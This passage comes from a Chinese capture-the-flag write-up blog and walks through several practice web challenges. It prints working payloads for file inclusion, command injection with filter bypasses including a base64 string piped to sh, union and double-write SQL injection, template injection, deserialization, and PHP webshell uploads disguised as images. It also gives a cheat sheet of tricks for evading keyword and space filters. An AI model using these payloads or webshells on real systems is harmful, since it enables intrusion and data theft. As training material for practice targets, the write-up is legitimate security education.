href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li></ul><h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622212914.png"></p><p>有个<code>get</code>型的参数，可以看到传入flag.php，这里是一个文件包含，但是无法查看php脚本的详细内容</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622213359.png"></p><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul><li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li></ul><h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625114703.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115544.png"></p><p>源代码出现<code>Archive_room.php</code>，点击跳转到这个页面</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115623.png"></p><p>再点select继续跳转到这个页面，查看源代码没发现什么特别的</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115649.png"></p><p>使用burpsuite抓下包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115827.png"></p><p>发现<code>secr3t.php</code>，访问得到源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset="UTF-8"&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到是文件包含，传入一个get型参数<code>file</code>，首先判断if语句中不允许存在<code>../</code>，<code>tp</code>，<code>data</code></p><pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625120412.png"></p><p>得到加密后内容，解码得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625120510.png"></p><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul><li>命令执行</li></ul><h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>主页面：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625141806.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625141944.png"></p><p>这里是存在命令<code>执行漏洞</code>的，我们尝试去使用<code>；</code>执行命令</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1;cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625143006.png"></p><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul><li>常规union select注入</li></ul><h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627205821.png"></p><p>抓包分析下</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627205935.png"></p><p>手动测试下注入点</p><blockquote><p>order by查下字段</p></blockquote><pre class="line-numbers language-none"><code class="language-none">admin' order by 3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210356.png"></p><blockquote><p>union select寻找显示位</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210541.png"></p><blockquote><p>查表</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210907.png"></p><p>发现<code>geekuser</code>,<code>l0ve1ysq1</code>两张表</p><blockquote><p>在l0ve1ysq1中查下字段</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211114.png"></p><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(id,username,password) from l0ve1ysq1),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211308.png"></p><p>得到flag</p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>变量拼接</p></li><li><p>sh，bash下编码</p></li><li><p>绕过空格过滤</p></li><li><p>绕过关键字过滤</p></li></ul><h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211908.png"></p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211937.png"></p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212028.png"></p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212229.png"></p><p>过滤了空格，使用<code>$IFS$1</code>来绕过</p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212341.png"></p><p>过滤了<code>flag</code>，但是可以查看下index.php</p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);    die("fxck your symbol!");  } else if(preg_match("/ /", $ip)){    die("fxck your space!");  } else if(preg_match("/bash/", $ip)){    die("fxck your bash!");  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){    die("fxck your flag!");  }  $a = shell_exec("ping -c 4 ".$ip);  echo "";  print_r($a);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>变量拼接</p></blockquote><p>可以使用变量拼接的方式绕过<code>flag</code>过滤</p><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;a=f;d=ag;c=l;cat$IFS$a$c$d.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>ps: 参数顺序要注意，adc换位acdflag会被检测出来：）</strong></p><p>过滤了<code>?/\{}()[]*</code> 否则bash语法可以用“？”，正斜杠“/”，数字和字母来执行系统命令。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627213653.png"></p><h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>sh，bash下编码</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><pre class="line-numbers language-none"><code class="language-none">$IFS${IFS}$IFS$1 //$1改成$加其他数字貌似都行&lt; //cat&lt;a.txt&lt;&gt;  {cat,flag.php}  //用逗号实现了空格功能%20 (space)%09 (tab)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><pre class="line-numbers language-none"><code class="language-none">$*$@$x    (x 代表 1-9)${x}   (x&gt;=10)在没有传参的情况下，上面的特殊变量都是为空的 ca${21}t a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><pre class="line-numbers language-none"><code class="language-none">ca\t a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="变量替换"><a href="#变量替换" class="headerlink" title="变量替换"></a>变量替换</h3><pre class="line-numbers language-none"><code class="language-none">a=ca;b=t;c=a.txt;aaab $c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><pre class="line-numbers language-none"><code class="language-none">c'a't flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="Base64-编码绕过"><a href="#Base64-编码绕过" class="headerlink" title="Base64 编码绕过"></a>Base64 编码绕过</h4><pre class="line-numbers language-none"><code class="language-none">root@kali:~/# echo 'cat a.txt'| base64 Y2F0IGEudHh0Cg==root@kali:~/# echo 'Y2F0IGEudHh0Cg==' | base64 -d abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><pre class="line-numbers language-none"><code class="language-none">root@kali:~/# echo 'cat a.txt' | xxd -p 63617420612e7478740aroot@kali:~/# echo '0x63617420612e7478740a'| xxd -r -p Abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><pre class="line-numbers language-none"><code class="language-none">? *[…]：匹配范围中任何一个字符 cat fl[abc]g.php[a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php{a,b}：对以逗号分割的文件列表进行拓展 cat fl{b,c}g.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h4><pre class="line-numbers language-none"><code class="language-none">1.&amp;&amp; 表示将任务置于后台执行2.&amp;&amp;只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。3.|| 表示管道，上一条命令的输出，作为下一条命令的参数4.||只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。5.；多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul><li>蚁剑或者中国菜刀等工具的使用</li></ul><h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><blockquote><p>主页：</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212304.png"></p><p>直接给出这个主页就是一句话木马</p><p>蚁剑连接，根目录查看到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212356.png"></p><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>X-Forwarded-For</p></li><li><p>referer</p></li><li><p>UA的修改</p></li></ul><h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212952.png"></p><p>直接发现Secret.php</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213031.png"></p><p>请求头中添加<code>referer</code></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213136.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213155.png"></p><p>修改<code>user-agent</code></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213230.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213244.png"></p><p>添加<code>X-Forwarded-For</code></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213346.png"></p><p>得到flag</p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><ul><li>scandir</li><li>传入参数名前面添加空格绕过waf</li></ul><h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629212925.png"></p><p>随便输入个数字，比如<code>1</code>测试下抓包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629213118.png"></p><p>通过查阅大佬的博客，这里可以使用<code>scandir('/')</code>，先扫下目录</p><pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir('/'))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此条payload中我们在num前面添加一个空格，也就是“ num”,添加空格的目的是假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（来自大佬的解释），继续测试，发现应该是过滤了 <code>\</code>，chr转换下</p><pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir(chr(47)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629215725.png"></p><p>发现<code>flagg</code>文件，然后使用<code>file_get_contents</code>读取文件内容，同样采取chr()的方式，然后再拼接起来</p><pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629220043.png"></p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h2><ul><li>Python模板注入（ssti）</li></ul><h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>根据题目名称tornado，搜索一番，发现tornado是一个Python的模板</p><p>welcome.txt提示render,经过查询render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210703163759.png"></p><p>三个文件中分别提示的内容为</p><ul><li>flag in /fllllllllllllag</li><li>render</li><li>md5(cookie_secret+md5(filename))</li></ul><p>然后抓个包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210703163938.png"></p><p>不难发现，在file文件下，传入了两个get型的参数，filename和filehash，为了得到flag，filename肯定传入/fllllllllllllag，而filehash需要根据md5(cookie_secret+md5(filename))找出对应的cookie_secret，所以我们重点是放在**找<code>cookie_secret</code>**上</p><p>修改请求行中的filename，发现提示</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712104918.png"></p><p>访问提示页面/error?msg=Error</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712105528.png"></p><p>存在模板注入，之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings,于是尝试输入<code>/error?msg={{handler.settings}}</code></p><p>发现 ‘cookie_secret’:</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712105649.png"></p><p>计算filehash值</p><pre class="line-numbers language-none"><code class="language-none">import hashlibmhash = hashlib.md5()filename='/fllllllllllllag'cookie_secret="3799aef2-cdfe-4c5d-ae04-47b3723689a0"hash.update(filename.encode('utf-8'))s1=hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode('utf-8'))print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712110251.png"></p><p>url传入</p><pre class="line-numbers language-none"><code class="language-none">/file?filename=/fllllllllllllag&amp;filehash=7828f14055747177adf201166beddeda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712110402.png"></p><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><h2 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h2><ul><li>上传phtml文件</li><li>嵌在script标签中的一句话木马</li><li>content-type的修改</li><li>请求体中的添加文件头</li></ul><h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>主页就是上传点，先上传一个正常的shell.php文件</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150743.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150731.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150829.png"></p><p>发现只能上传image，bp抓包依次尝试文件后缀名修改，content-type修改、文件名%00截断，添加文件头都失败</p><p>然后更改文件名为xx.phtml,，phtml是嵌入了php代码的html文件，尝试上传，请求体中的内容仍然是普通的一句话木马文件</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151252.png"></p><p>检测到<code>&lt;?</code>请求体中的内容需要更改为：</p><pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仍然不行，所以修改继续在请求头中添加一项</p><pre class="line-numbers language-none"><code class="language-none">GIF89a&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151704.png"></p><p>上传成功，用后门软件连接即可，链接地址经过测试在：</p><pre class="line-numbers language-none"><code class="language-none">http://eb74e5c1-2c38-4013-8035-e32ba42d81a4.node4.buuoj.cn/upload/shell.phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151942.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712152026.png"></p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h2><ul><li>备份文件泄露</li><li>反序列漏洞</li></ul><h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>主页：（提示我们存在备份文件），扫一下常见备份目录</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210714094451.png"></p><p>发现<code>www.zip</code>，打开源码，在<code>index.php</code>发现有个存在反序列化漏洞</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210714094935.png"></p><p>然后在<code>class.php</code>中可以看到，如果满足两个条件：</p><ul><li>password的值等于<code>100</code></li><li>username的值等于<code>admin</code></li></ul><p>即可输出flag，但是如何让username的值为admin呢？由于wakeup方法会导致username成为guest，因此需要通过序列化字符串中对象的个数来绕过该方法。</p><blockquote><p>跳过__wakeup()</p></blockquote><p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p><p>因此我们将序列化这样设置</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nameusername"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Namepassword"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过还是没有结束，因为这个声明变量是private</p><blockquote><p>private</p></blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p><p>我们再次改造一下序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00Name%00password"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">?</span>select<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="知识点-16"><a href="#知识点-16" class="headerlink" title="知识点"></a>知识点</h2><ul><li>文件上传前端校验</li><li>.phtml的用法</li></ul><h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715105425.png"></p><p>在主页是一个上传点，直接上传一个shell.php，发现弹窗提示，只能上三种类型的文件</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715105541.png"></p><p>一番查看，是前端校验，删除事件，继续上传shell.php，抓包分析：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715110642.png"></p><p>.php后缀的文件仍然不能上传，然后试一试更改content-type，添加文件头，以及%00阶段，依然不行，然后上传一个.phtml的文件，发现上传成功，再将请求头中的内容改为</p><pre class="line-numbers language-none"><code class="language-none">&lt;script language='php'&gt;@eval($_POST['a']);&lt;/script&gt;&lt;script language='php'&gt;system('cat /flag');&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>继续上传，即可看到flag</p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><h2 id="知识点-17"><a href="#知识点-17" class="headerlink" title="知识点"></a>知识点</h2><ul><li>双写绕过</li></ul><h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登录框</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716090603.png"></p><p>随便输入两个参数，发现是传入的是get型参数</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716090738.png"></p><p>首先注入肯定存在，先尝试联合查询注入：</p><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+union+select+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>失败，双写union 和 select可绕过</p><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716091931.png"></p><p>登陆成功，将参数admin置为假，可以看到页面有显示位置：</p><pre class="line-numbers language-none"><code class="language-none">check.php?username=-admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716092158.png"></p><p>然后尝试注入</p><pre class="line-numbers language-none"><code class="language-none">/check.php?username=1' ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716093923.png"></p><pre class="line-numbers language-none"><code class="language-none">check.php?username=1' ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716093839.png"></p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><h2 id="知识点-18"><a href="#知识点-18" class="headerlink" 